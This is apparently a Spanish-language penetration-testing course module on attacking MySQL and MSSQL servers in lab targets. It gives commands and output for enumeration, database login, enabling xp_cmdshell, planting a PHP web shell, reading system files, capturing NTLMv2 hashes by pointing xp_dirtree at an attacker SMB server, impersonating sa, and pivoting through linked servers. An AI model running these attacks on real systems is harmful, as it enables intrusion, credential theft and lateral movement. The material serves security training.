[MySQL](https://www.mysql.com/) y [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) son sistemas de gestión de [relational database](https://en.wikipedia.org/wiki/Relational_database) que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales como MSSQL y MySQL utilizan el [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) para consultar y mantener la base de datos.

Los hosts de bases de datos se consideran objetivos importantes ya que son responsables de almacenar todo tipo de datos sensibles, incluyendo, entre otros, credenciales de usuario, `Personal Identifiable Information (PII)`, datos relacionados con negocios e información de pagos. Además, esos servicios a menudo están configurados con usuarios altamente privilegiados. Si obtenemos acceso a una base de datos, podríamos aprovechar esos privilegios para más acciones, incluyendo movimiento lateral y escalación de privilegios.

---

## Enumeration

Por defecto, MSSQL usa los puertos `TCP/1433` y `UDP/1434`, y MySQL usa `TCP/3306`. Sin embargo, cuando MSSQL opera en modo "oculto", utiliza el puerto `TCP/2433`. Podemos usar los scripts predeterminados de `Nmap` con la opción `-sC` para enumerar servicios de bases de datos en un sistema objetivo:

### Banner Grabbing

```r
nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

El escaneo de Nmap revela información esencial sobre el objetivo, como la versión y el nombre del host, que podemos usar para identificar configuraciones incorrectas comunes, ataques específicos o vulnerabilidades conocidas. Exploremos algunas configuraciones incorrectas comunes y ataques específicos de protocolo.

---

## Authentication Mechanisms

`MSSQL` admite dos [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), lo que significa que los usuarios pueden ser creados en Windows o en el SQL Server:

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|Este es el modo predeterminado, a menudo llamado `integrated` security porque el modelo de seguridad de SQL Server está estrechamente integrado con Windows/Active Directory. Cuentas de usuario y grupos específicos de Windows tienen permiso para iniciar sesión en SQL Server. Los usuarios de Windows que ya han sido autenticados no necesitan presentar credenciales adicionales.|
|`Mixed mode`|El modo mixto admite autenticación por cuentas de Windows/Active Directory y SQL Server. Los pares de nombre de usuario y contraseña se mantienen dentro del SQL Server.|

`MySQL` también admite diferentes [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), como nombre de usuario y contraseña, así como autenticación de Windows (se requiere un plugin). Además, los administradores pueden [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) por muchas razones, incluyendo compatibilidad, seguridad, usabilidad y más. Sin embargo, dependiendo del método implementado, pueden ocurrir configuraciones incorrectas.

En el pasado, hubo una vulnerabilidad [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) en servidores `MySQL 5.6.x`, entre otros, que permitía eludir la autenticación repitiendo el mismo incorrecto password para la cuenta dada porque la vulnerabilidad de `timing attack` existía en la forma en que MySQL manejaba los intentos de autenticación.

En este ataque de temporización, MySQL intenta repetidamente autenticarse en un servidor y mide el tiempo que tarda el servidor en responder a cada intento. Al medir el tiempo que tarda el servidor en responder, podemos determinar cuándo se ha encontrado la contraseña correcta, incluso si el servidor no indica éxito o fracaso.

En el caso de `MySQL 5.6.x`, el servidor tarda más en responder a una contraseña incorrecta que a una correcta. Por lo tanto, si intentamos repetidamente autenticarnos con la misma contraseña incorrecta, eventualmente recibiremos una respuesta que indica que se encontró la contraseña correcta, aunque no sea así.

### Misconfigurations

Una configuración incorrecta de autenticación en SQL Server puede permitirnos acceder al servicio sin credenciales si se habilita el acceso anónimo, se configura un usuario sin contraseña, o si se permite que cualquier usuario, grupo o máquina acceda al SQL Server.

### Privileges

Dependiendo de los privilegios del usuario, podemos realizar diferentes acciones dentro de un SQL Server, como:

- Leer o cambiar el contenido de una base de datos
- Leer o cambiar la configuración del servidor
- Ejecutar comandos
- Leer archivos locales
- Comunicarse con otras bases de datos
- Capturar el hash del sistema local
- Suplantar usuarios existentes
- Obtener acceso a otras redes

En esta sección, exploraremos algunos de estos ataques.

---

## Protocol Specific Attacks

Es crucial entender cómo funciona la sintaxis SQL. Podemos usar el módulo gratuito [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) para introducirnos en la sintaxis SQL. Aunque este módulo cubre MySQL, la sintaxis de MSSQL y MySQL es bastante similar.

### Read/Change the Database

Imaginemos que obtenemos acceso a una base de datos SQL. Primero, necesitamos identificar las bases de datos existentes en el servidor, qué tablas contiene la base de datos y finalmente el contenido de cada tabla. Ten en cuenta que podríamos encontrar bases de datos con cientos de tablas. Si nuestro objetivo no es solo acceder a los datos, necesitaremos seleccionar qué tablas pueden contener información interesante para continuar nuestros ataques, como nombres de usuario y contraseñas, tokens, configuraciones y más. Veamos cómo podemos hacer esto:

### MySQL - Connecting to the SQL Server

```r
mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

### Sqlcmd - Connecting to the SQL Server

```r
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

**Note:** Cuando nos autenticamos en MSSQL usando `sqlcmd` podemos usar los parámetros `-y` (SQLCMDMAXVARTYPEWIDTH) y `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) para una mejor visualización de la salida. Ten en cuenta que puede afectar el rendimiento.

Si estamos atacando `MSSQL` desde Linux, podemos usar `sqsh` como una alternativa a `sqlcmd`:

```r
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
``

`

Alternativamente, podemos usar la herramienta de Impacket con el nombre `mssqlclient.py`.

```r
mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

**Note:** Cuando nos autenticamos en MSSQL usando `sqsh` podemos usar los parámetros `-h` para deshabilitar encabezados y pies de página para una apariencia más limpia.

Cuando usamos Windows Authentication, necesitamos especificar el nombre del dominio o el nombre del host de la máquina objetivo. Si no especificamos un dominio o nombre de host, asumirá SQL Authentication y se autenticará contra los usuarios creados en el SQL Server. En cambio, si definimos el dominio o nombre del host, utilizará Windows Authentication. Si estamos atacando una cuenta local, podemos usar `SERVERNAME\\accountname` o `.\accountname`. El comando completo se vería así:

```r
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

### SQL Default Databases

Antes de explorar el uso de la sintaxis SQL, es esencial conocer las bases de datos predeterminadas para `MySQL` y `MSSQL`. Esas bases de datos contienen información sobre la base de datos en sí y nos ayudan a enumerar nombres de bases de datos, tablas, columnas, etc. Con acceso a esas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la empresa.

**Note:** Obtendremos un error si intentamos listar o conectarnos a una base de datos a la que no tenemos permisos.

`MySQL` esquemas/schemas predeterminados del sistema:

- `mysql` - es la base de datos del sistema que contiene tablas que almacenan información requerida por el servidor MySQL
- `information_schema` - proporciona acceso a metadatos de la base de datos
- `performance_schema` - es una característica para monitorear la ejecución del servidor MySQL a un nivel bajo
- `sys` - un conjunto de objetos que ayuda a los DBAs y desarrolladores a interpretar los datos recopilados por el Performance Schema

`MSSQL` esquemas/schemas predeterminados del sistema:

- `master` - guarda la información para una instancia de SQL Server.
- `msdb` - utilizada por SQL Server Agent.
- `model` - una base de datos de plantilla copiada para cada nueva base de datos.
- `resource` - una base de datos de solo lectura que guarda objetos del sistema visibles en cada base de datos en el servidor en el esquema sys.
- `tempdb` - guarda objetos temporales para consultas SQL.

### SQL Syntax

### Show Databases

```r
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Si usamos `sqlcmd`, necesitaremos usar `GO` después de nuestra consulta para ejecutar la sintaxis SQL.

```r
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

### Select a Database

```r
mysql> USE htbusers;

Database changed
```

```r
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

### Show Tables

```r
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

```r
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

### Select all Data from Table "users"

```r
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```r
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

---

## Execute Commands

`Command execution` es una de las capacidades más deseadas al atacar servicios comunes porque nos permite controlar el sistema operativo. Si tenemos los privilegios apropiados, podemos usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios para hacerlo.

`MSSQL` tiene un [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) llamado [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) que nos permite ejecutar comandos del sistema usando SQL. Ten en cuenta lo siguiente sobre `xp_cmdshell`:

- `xp_cmdshell` es una característica poderosa y está deshabilitada por defecto. `xp_cmdshell` puede habilitarse y deshabilitarse usando el [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) o ejecutando [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- El proceso de Windows generado por `xp_cmdshell` tiene los mismos derechos de seguridad que la cuenta de servicio de SQL Server
- `xp_cmdshell` opera de manera sincrónica. El control no se devuelve al llamador hasta que el comando del shell de comandos se completa

Para ejecutar comandos usando sintaxis SQL en MSSQL, usa:

### XP_CMDSHELL

```r
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si `xp_cmdshell` no está habilitado, podemos habilitarlo, si tenemos los privilegios apropiados, usando el siguiente comando:


```r
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

Hay otros métodos para obtener la ejecución de comandos, como agregar [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) y [external scripts](https://docs.microsoft.com/en-us/sql

/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Sin embargo, además de esos métodos, también hay funcionalidades adicionales que se pueden usar como el comando `xp_regwrite` que se utiliza para elevar privilegios creando nuevas entradas en el registro de Windows. No obstante, esos métodos están fuera del alcance de este módulo.

`MySQL` admite [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) que nos permiten ejecutar código en C/C++ como una función dentro de SQL, hay una User Defined Function para la ejecución de comandos en este [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). No es común encontrar una User Defined Function como esta en un entorno de producción, pero debemos estar conscientes de que podríamos usarla.

---

## Write Local Files

`MySQL` no tiene un procedimiento almacenado como `xp_cmdshell`, pero podemos lograr la ejecución de comandos si escribimos en una ubicación en el sistema de archivos que pueda ejecutar nuestros comandos. Por ejemplo, supongamos que `MySQL` opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. Si tenemos los privilegios apropiados, podemos intentar escribir un archivo usando [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) en el directorio del servidor web. Luego podemos navegar a la ubicación donde se encuentra el archivo y ejecutar nuestros comandos.

### MySQL - Write Local File

```r
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

En `MySQL`, una variable global del sistema [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por las sentencias `LOAD DATA` y `SELECT … INTO OUTFILE` y la función [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file). Estas operaciones solo están permitidas para usuarios que tienen el privilegio [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file).

`secure_file_priv` puede configurarse de la siguiente manera:

- Si está vacío, la variable no tiene efecto, lo cual no es una configuración segura.
- Si se establece en el nombre de un directorio, el servidor limita las operaciones de importación y exportación para trabajar solo con archivos en ese directorio. El directorio debe existir; el servidor no lo crea.
- Si se establece en NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo, podemos ver que la variable `secure_file_priv` está vacía, lo que significa que podemos leer y escribir datos usando `MySQL`:

### MySQL - Secure File Privileges

```r
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Para escribir archivos usando `MSSQL`, necesitamos habilitar [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), lo que requiere privilegios de administrador, y luego ejecutar algunos procedimientos almacenados para crear el archivo:

### MSSQL - Enable Ole Automation Procedures

```r
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

### MSSQL - Create a File

```r
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---

## Read Local Files

Por defecto, `MSSQL` permite la lectura de archivos en cualquier archivo en el sistema operativo al que la cuenta tenga acceso de lectura. Podemos usar la siguiente consulta SQL:

### Read Local Files in MSSQL

```r
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Como mencionamos anteriormente, por defecto una instalación de `MySQL` no permite la lectura arbitraria de archivos, pero si los ajustes correctos están en su lugar y con los privilegios apropiados, podemos leer archivos usando los siguientes métodos:

### MySQL - Read Local Files in MySQL

```r
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---
## Capture MSSQL Service Hash

En la sección `Attacking SMB`, discutimos que podríamos crear un servidor SMB falso para robar un hash y abusar de alguna implementación predeterminada dentro de un sistema operativo Windows. También podemos robar el hash de la cuenta del servicio MSSQL usando los procedimientos almacenados no documentados `xp_subdirs` o `xp_dirtree`, que utilizan el protocolo SMB para recuperar una lista de subdirectorios bajo un directorio principal especificado desde el sistema de archivos. Cuando usamos uno de estos procedimientos almacenados y lo apuntamos a nuestro servidor SMB, la funcionalidad de escucha de directorios forzará al servidor a autenticarse y enviar el hash NTLMv2 de la cuenta de servicio que está ejecutando el SQL Server.

Para que esto funcione, primero necesitamos iniciar [Responder](https://github.com/lgandx/Responder) o [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) y ejecutar una de las siguientes consultas SQL:

### XP_DIRTREE Hash Stealing

```r
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

### XP_SUBDIRS Hash Stealing

```r
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Si la cuenta de servicio tiene acceso a nuestro servidor, obtendremos su hash. Luego podemos intentar crackear el hash o reenviarlo a otro host.

### XP_SUBDIRS Hash Stealing with Responder

```r
sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

### XP_SUBDIRS Hash Stealing with impacket

```r
sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

---
## Impersonate Existing Users with MSSQL

SQL Server tiene un permiso especial, llamado `IMPERSONATE`, que permite al usuario que ejecuta tomar los permisos de otro usuario o iniciar sesión hasta que el contexto se restablezca o la sesión termine. Exploremos cómo el privilegio `IMPERSONATE` puede llevar a la escalación de privilegios en SQL Server.

Primero, necesitamos identificar a los usuarios que podemos suplantar. Los administradores del sistema pueden suplantar a cualquiera por defecto, pero para los usuarios que no son administradores, los privilegios deben ser asignados explícitamente. Podemos usar la siguiente consulta para identificar a los usuarios que podemos suplantar:

### Identify Users that We Can Impersonate

```r
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Para tener una idea de las posibilidades de escalación de privilegios, verifiquemos si nuestro usuario actual tiene el rol de sysadmin:

### Verifying our Current User and Role

```r
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como el valor devuelto `0` indica, no tenemos el rol de sysadmin, pero podemos suplantar al usuario `sa`. Suplantemos al usuario y ejecutemos los mismos comandos. Para suplantar a un usuario, podemos usar la declaración Transact-SQL `EXECUTE AS LOGIN` y configurarla al usuario que queremos suplantar.

### Impersonating the SA User

```r
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

**Note:** Es recomendable ejecutar `EXECUTE AS LOGIN` dentro de la base de datos master, porque todos los usuarios, por defecto, tienen acceso a esa base de datos. Si un usuario que estás tratando de suplantar no tiene acceso a la base de datos a la que te estás conectando, presentará un error. Intenta moverte a la base de datos master usando `USE master`.

Ahora podemos ejecutar cualquier comando como sysadmin, como indica el valor devuelto `1`. Para revertir la operación y regresar a nuestro usuario anterior, podemos usar la declaración Transact-SQL `REVERT`.

**Note:** Si encontramos un usuario que no es sysadmin, aún podemos verificar si el usuario tiene acceso a otras bases de datos o servidores vinculados.

---

## Communicate with Other Databases with MSSQL

`MSSQL` tiene una opción de configuración llamada [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Los servidores vinculados generalmente se configuran para permitir que el motor de la base de datos ejecute una declaración Transact-SQL que incluya tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos obtener acceso a un SQL Server con un servidor vinculado configurado, podríamos movernos lateralmente a ese servidor de base de datos. Los administradores pueden configurar un servidor vinculado usando credenciales del servidor remoto. Si esas credenciales tienen privilegios de sysadmin, podríamos ejecutar comandos en la instancia de SQL remota. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

### Identify linked Servers in MSSQL

```r
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Como podemos ver en la salida de la consulta, tenemos el nombre del servidor y la columna `isremote`, donde `1` significa que es un servidor remoto y `0` es un servidor vinculado. Podemos ver [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) para más información.

A continuación, podemos intentar identificar el usuario utilizado para la conexión y sus privilegios. La declaración [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) puede usarse para enviar comandos pasantes a servidores vinculados. Agregamos nuestro comando entre paréntesis y especificamos el servidor vinculado entre corchetes (`[ ]`).

```r
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

**Note:** Si necesitamos usar comillas en nuestra consulta al servidor vinculado, necesitamos usar comillas dobles simples para escapar la comilla simple. Para ejecutar múltiples comandos a la vez podemos dividirlos con un punto y coma (;).

Como hemos visto, ahora podemos ejecutar consultas con privilegios de sysadmin en el servidor vinculado. Como `sysadmin`, controlamos la instancia de SQL Server. Podemos leer datos de cualquier base de datos o ejecutar comandos del sistema con `xp_cmdshell`. Esta sección cubrió algunas de las formas más comunes de atacar SQL Server y bases de datos MySQL durante los compromisos de pruebas de penetración. Hay otros métodos para atacar estos tipos de bases de datos, así como otros, como [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database) y [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) que se cubrirán en otros módulos. Vale la pena tomarse un tiempo para leer sobre estas tecnologías de bases de datos y algunas de las formas comunes de atacarlas también.